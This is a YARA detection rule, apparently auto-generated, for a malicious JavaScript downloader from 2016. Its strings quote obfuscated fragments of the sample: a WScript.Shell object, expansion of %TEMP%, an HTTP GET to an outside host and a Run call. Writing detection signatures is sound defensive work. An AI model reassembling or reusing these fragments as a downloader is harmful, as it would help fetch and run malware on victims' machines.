rule sig_20160427_c457cfff7d360080624b55da2ae2aca6 {
  meta:
    description = "datamaliciousorder - file 20160427_c457cfff7d360080624b55da2ae2aca6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aca13acd3a6d756eb63150e25b58a9133397782d826f7d1ebc16b4dd4f816b44"

  strings:
    $s1  = "function RzskdFbznd() {return EsmhiRatzd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xBHwcZR" ascii
    $s2  = "function RzskdFbznd() {return EsmhiRatzd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xBHwcZR" ascii
    $s3  = "function MtnhkGdhth(NplsyMdvnu, PwhsfYrscm){HckdfZpvhp = HckdfZpvhp * 1; return NplsyMdvnu - PwhsfYrscm;};" fullword ascii
    $s4  = "var EsmhiRatzd = function VmavzWinaz() {return KvxrhBhkqq[JlzltBzywa](\"WScript\"+\".Shell\");}(), OvslwJmopz = 11;" fullword ascii
    $s5  = "FpogzKtyeg[LdbetJbbvz](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var KvxrhBhkqq = this[\"WScript\"];" fullword ascii
    $s7  = "function FgpfeHzocx(){return PamzqBvdqj + \"\";};" fullword ascii
    $s8  = "if (FpogzKtyeg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function DvmzkNrydx() {return ((OqajxCdptl == true) && (OqajxCdptl == CcddzKnegs)) ? 1 : HckdfZpvhp;};" fullword ascii
    $s10 = "function HxymdRnvpa(JeckbRilsu){EsmhiRatzd[\"R\"+\"un\"](JeckbRilsu, HckdfZpvhp, HckdfZpvhp);};" fullword ascii
    $s11 = "CcddzKnegs = true; " fullword ascii
    $s12 = "function HenedVborw(){return 23;};" fullword ascii
    $s13 = "QwfloOsmyb = true;" fullword ascii
    $s14 = "return MtnhkGdhth(PdthwVhxsb, VhybsUipwb);" fullword ascii
    $s15 = "var CcddzKnegs = false;" fullword ascii
    $s16 = "OqajxCdptl = true; " fullword ascii
    $s17 = "var QwfloOsmyb = false;" fullword ascii
    $s18 = "function NsgckAxtgr(){return JlzltBzywa;};" fullword ascii
    $s19 = "function QzsxnEwuhg()" fullword ascii
    $s20 = "function GoiltUrrfk(JljehPygbd) {var RpbezAgelf = (1, 2, 3, 4, 5, JljehPygbd); return RpbezAgelf;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}